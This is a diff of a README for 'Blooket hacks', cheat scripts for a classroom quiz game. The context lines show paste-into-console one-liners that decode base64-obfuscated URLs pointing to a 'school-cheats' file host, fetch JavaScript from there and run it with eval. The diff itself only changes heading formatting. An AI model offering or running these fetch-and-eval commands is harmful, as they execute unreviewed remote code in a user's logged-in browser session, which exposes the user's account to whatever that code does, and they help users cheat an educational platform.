@@ -1,4 +1,4 @@
-# blooket
+# Blooket
 blooket hacks
 
 ## <a id="addTokens.js"></a>addTokens.js
@@ -30,7 +30,10 @@ Open console (ctrl + shift + j) and paste the following:
 fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbEV2ZXJ5QW5zd2VyQ29ycmVjdC5qcw==')).then((res) => res.text().then((t) => eval(t)))
 ```
 
-#Gold
+
+
+## Gold
+
 
 
 ## <a id="chest-esp.js"></a>chest-esp.js
@@ -40,7 +43,7 @@ Open console (ctrl + shift + j) and paste the following:
 fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dvbGRDaGVzdEVTUC5qcw==')).then((res) => res.text().then((t) => eval(t)))
 ```
 
-## <a id="Getgold"><//a>Getgold.js
+## <a id="Getgold"></a>Getgold.js
 
 Open console (ctrl + shift + j) and paste the following:
 ```js
